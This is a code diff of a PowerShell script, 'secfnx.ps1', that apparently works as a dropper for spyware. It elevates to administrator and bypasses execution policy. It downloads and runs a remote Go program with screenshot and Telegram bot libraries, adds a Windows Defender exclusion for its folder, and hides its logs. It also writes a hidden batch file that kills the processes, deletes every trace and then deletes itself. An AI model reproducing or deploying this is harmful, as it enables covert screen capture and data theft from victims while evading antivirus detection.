@@ -1,5 +1,5 @@
 # secfnx.ps1
-# Downloads Go MSI, sets up environment, downloads monitoring.go, and runs it as a script
+# Downloads Go MSI, sets up environment, downloads monitoring.go, runs it, creates retry uninstall batch
 # USAGE: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\secfnx.ps1
 
 param(
@@ -9,29 +9,25 @@ param(
 )
 
 # Config
-$LogFile = Join-Path $env:TEMP "download_runner.log"
-$MsiName = "go1.24.7.windows-amd64.msi"
-$MsiUrl = "https://go.dev/dl/go1.24.7.windows-amd64.msi"
-$Url = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/monitoring.go"
+$LogFile      = Join-Path $env:TEMP "download_runner.log"
+$MsiName      = "go1.24.7.windows-amd64.msi"
+$MsiUrl       = "https://go.dev/dl/go1.24.7.windows-amd64.msi"
+$Url          = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/monitoring.go"
 $GoInstallDir = "C:\Program Files\Go"
-$GoBinPath = Join-Path $GoInstallDir "bin"
-$GoFileName = "monitoring.go"
-$DestFolder = Join-Path $env:USERPROFILE "Downloads\secfnx"
-$GoFilePath = Join-Path $DestFolder $GoFileName
-$PathLog = Join-Path $DestFolder "path_sec.log"
-$LogMaxSize = 10MB
+$GoBinPath    = Join-Path $GoInstallDir "bin"
+$GoFileName   = "monitoring.go"
+$DestFolder   = Join-Path $env:USERPROFILE "Downloads\secfnx"
+$GoFilePath   = Join-Path $DestFolder $GoFileName
+$PathLog      = Join-Path $DestFolder "path_sec.log"
+$LogMaxSize   = 10MB
 
-# Status Output Helper
+# --- Helper functions ---
+
 function Status-Output {
-    param(
-        [string]$Message,
-        [bool]$Success
-    )
-    if ($Success) { Write-Host "[True] $Message" }
-    else { Write-Host "[False] $Message" }
+    param([string]$Message,[bool]$Success)
+    if ($Success) { Write-Host "[True] $Message" } else { Write-Host "[False] $Message" }
 }
 
-# Logging
 function Log {
     param($Message)
     $Line = "$(Get-Date -Format o) - $Message"
@@ -53,11 +49,8 @@ function Log-Path {
 }
 
 function Test-IsAdmin {
-    try {
-        ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    } catch {
-        $false
-    }
+    try { ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }
+    catch { $false }
 }
 
 function Download-File($SourceUrl, $OutPath) {
@@ -72,176 +65,101 @@ function Download-File($SourceUrl, $OutPath) {
         Log "Download failed: $_"
         Status-Output "Downloaded $OutPath" $false
         return $false
-    } finally {
-        $ProgressPreference = 'SilentlyContinue'
-    }
+    } finally { $ProgressPreference = 'SilentlyContinue' }
 }
 
 function Add-ToSystemPath($Path) {
-    if (-not (Test-IsAdmin)) {
-        Log "Cannot modify PATH: not admin"
-        Status-Output "Add to PATH $Path" $false
-        return $false
-    }
+    if (-not (Test-IsAdmin)) { Status-Output "Add to PATH $Path" $false; return $false }
     try {
         $CurrentPath = [Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
         if ($CurrentPath -notlike "*$Path*") {
             $NewPath = "$CurrentPath;$Path"
             [Environment]::SetEnvironmentVariable("Path", $NewPath, [System.EnvironmentVariableTarget]::Machine)
-            Log "System PATH updated"
             Status-Output "Add to PATH $Path" $true
-            return $true
-        }
-        Status-Output "Add to PATH $Path (already exists)" $true
+        } else { Status-Output "Add to PATH $Path (already exists)" $true }
         return $true
-    } catch {
-        Log "Failed to update PATH: $_"
-        Status-Output "Add to PATH $Path" $false
-        return $false
-    }
+    } catch { Status-Output "Add to PATH $Path" $false; return $false }
 }
 
 function Add-DefenderExclusion($Path) {
-    if (-not (Test-IsAdmin)) {
-        Log "Cannot add Defender exclusion: not admin"
-        Status-Output "Defender Exclusion $Path" $false
-        return $false
-    }
-    try {
-        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
-        Log "Exclusion added"
-        Status-Output "Defender Exclusion $Path" $true
-        return $true
-    } catch {
-        Log "Failed to add Defender exclusion: $_"
-        Status-Output "Defender Exclusion $Path" $false
-        return $false
-    }
+    if (-not (Test-IsAdmin)) { Status-Output "Defender Exclusion $Path" $false; return $false }
+    try { Add-MpPreference -ExclusionPath $Path -ErrorAction Stop; Status-Output "Defender Exclusion $Path" $true; return $true }
+    catch { Status-Output "Defender Exclusion $Path" $false; return $false }
 }
 
 function Install-Go {
     $MsiPath = Join-Path $DestFolder $MsiName
-    if (Test-Path (Join-Path $GoInstallDir "bin\go.exe")) {
-        Log "Go already installed at $GoInstallDir"
-        Status-Output "Install Go" $true
-        return $true
-    }
-    if (-not (Test-IsAdmin)) {
-        Log "Cannot install Go: not admin"
-        Status-Output "Install Go" $false
-        return $false
-    }
-    if (-not (Download-File $MsiUrl $MsiPath)) {
-        Status-Output "Install Go" $false
-        return $false
-    }
+    if (Test-Path (Join-Path $GoInstallDir "bin\go.exe")) { Status-Output "Install Go" $true; return $true }
+    if (-not (Test-IsAdmin)) { Status-Output "Install Go" $false; return $false }
+    if (-not (Download-File $MsiUrl $MsiPath)) { Status-Output "Install Go" $false; return $false }
     try {
-        # Run MSI installer with dialog
-        $Args = "/i `"$MsiPath`""
-        Start-Process -FilePath "msiexec.exe" -ArgumentList $Args -Wait
+        Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$MsiPath`"" -Wait
         Add-ToSystemPath $GoBinPath
         [Environment]::SetEnvironmentVariable("GOROOT", $GoInstallDir, [System.EnvironmentVariableTarget]::Machine)
         Status-Output "Install Go" $true
         return $true
-    } catch {
-        Log "Go MSI install error: $_"
-        Status-Output "Install Go" $false
-        return $false
-    }
+    } catch { Status-Output "Install Go" $false; return $false }
 }
 
 function Install-GoDependencies($GoFile) {
     if (-not (Test-Path $GoFile)) { Status-Output "Install Dependencies" $false; return $false }
-    try {
-        $Env:PATH = "$Env:PATH;$GoBinPath"
-        $GoMod = Join-Path $DestFolder "go.mod"
-        $GoSum = Join-Path $DestFolder "go.sum"
-        if (Test-Path $GoMod) { Remove-Item $GoMod -Force -ErrorAction SilentlyContinue; Log-Path $GoMod "File Deleted" }
-        if (Test-Path $GoSum) { Remove-Item $GoSum -Force -ErrorAction SilentlyContinue; Log-Path $GoSum "File Deleted" }
-
-        Start-Process -FilePath "go" -ArgumentList "mod", "init", "monitoring" -WorkingDirectory $DestFolder -Wait -NoNewWindow
-        Status-Output "Initialize Go Module" $true
-        Start-Process -FilePath "go" -ArgumentList "get", "-v", "github.com/kbinani/screenshot", "github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -Wait -NoNewWindow
-        Status-Output "Install Dependencies" $true
-        return $true
-    } catch {
-        Log "Dependency install error: $_"
-        Status-Output "Install Dependencies" $false
-        return $false
-    }
+    $Env:PATH = "$Env:PATH;$GoBinPath"
+    $GoMod = Join-Path $DestFolder "go.mod"
+    $GoSum = Join-Path $DestFolder "go.sum"
+    if (Test-Path $GoMod) { Remove-Item $GoMod -Force -ErrorAction SilentlyContinue; Log-Path $GoMod "File Deleted" }
+    if (Test-Path $GoSum) { Remove-Item $GoSum -Force -ErrorAction SilentlyContinue; Log-Path $GoSum "File Deleted" }
+    Start-Process -FilePath "go" -ArgumentList "mod", "init", "monitoring" -WorkingDirectory $DestFolder -Wait -NoNewWindow
+    Status-Output "Initialize Go Module" $true
+    Start-Process -FilePath "go" -ArgumentList "get", "-v", "github.com/kbinani/screenshot", "github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -Wait -NoNewWindow
+    Status-Output "Install Dependencies" $true
 }
 
 function Run-GoScript($GoFile) {
     if (-not (Test-Path $GoFile)) { Status-Output "Run Go Script" $false; return $false }
-    try {
-        $Env:PATH = "$Env:PATH;$GoBinPath"
-        Start-Process -FilePath "go" -ArgumentList "run", $GoFile -WorkingDirectory $DestFolder -Wait -NoNewWindow
-        Status-Output "Run Go Script" $true
-        return $true
-    } catch {
-        Log "Failed to run Go script: $_"
-        Status-Output "Run Go Script" $false
-        return $false
-    }
+    $Env:PATH = "$Env:PATH;$GoBinPath"
+    Start-Process -FilePath "go" -ArgumentList "run", $GoFile -WorkingDirectory $DestFolder -Wait -NoNewWindow
+    Status-Output "Run Go Script" $true
 }
 
-# Main
+# --- Main Execution ---
+
 if (-not (Test-IsAdmin)) {
-    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSScriptRoot\$($MyInvocation.MyCommand.Name)`""
-    exit
+    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSScriptRoot\$($MyInvocation.MyCommand.Name)`""; exit
 }
 
 if (-not (Test-Path $DestFolder)) { New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null; Status-Output "Create Folder" $true }
-
 if (-not (Test-Path $PathLog)) { New-Item -Path $PathLog -ItemType File -Force | Out-Null; Set-ItemProperty -Path $PathLog -Name Attributes -Value "Hidden"; Status-Output "Create Path Log" $true }
 
-# Download Go language file
 if (-not (Download-File $Url $GoFilePath)) { exit 1 }
-Status-Output "Fully Go Language File Downloaded from link" $true
+Status-Output "Fully Go Language File Downloaded" $true
 
-# Install Go MSI
 if (-not (Install-Go)) { exit 1 }
-
-# Defender exclusion
 Add-DefenderExclusion $DestFolder
-
-# Install dependencies
 if (-not (Install-GoDependencies $GoFilePath)) { exit 1 }
-
-# Run Go script
 Run-GoScript $GoFilePath
-
 Status-Output "Script Completed" $true
 
-# ---------------- Create secfix_un.bat for /uninstall ----------------
-$BatPath = Join-Path $env:TEMP "secfix_un.bat"
+# --- Create retry uninstall batch ---
 
+$BatPath = Join-Path $env:TEMP "secfix_un.bat"
 $SecfnxFolder = $DestFolder
 $Ps1Path = $MyInvocation.MyCommand.Definition
 $GoInstallDir = "C:\Program Files\Go"
 
 $BatContent = @"
 @echo off
-:: Close monitoring process
+:retry
 taskkill /F /IM monitoring.exe >nul 2>&1
 taskkill /F /IM go.exe >nul 2>&1
-
-:: Delete secfnx folder
-rmdir /S /Q "$SecfnxFolder"
-
-:: Delete PS1 script
-del /F /Q "$Ps1Path"
-
-:: Delete Go installation
-rmdir /S /Q "$GoInstallDir"
-
-:: Delete this batch file
+rmdir /S /Q "$SecfnxFolder" 2>nul
+del /F /Q "$Ps1Path" 2>nul
+rmdir /S /Q "$GoInstallDir" 2>nul
+if exist "$SecfnxFolder" goto retry
+if exist "$Ps1Path" goto retry
+if exist "$GoInstallDir" goto retry
 del /F /Q "%~f0"
 "@
 
-# Write bat file
 Set-Content -Path $BatPath -Value $BatContent -Encoding ASCII
-# Hide the batch file
 attrib +h $BatPath
-
 Status-Output "Created secfix_un.bat for /uninstall" $true
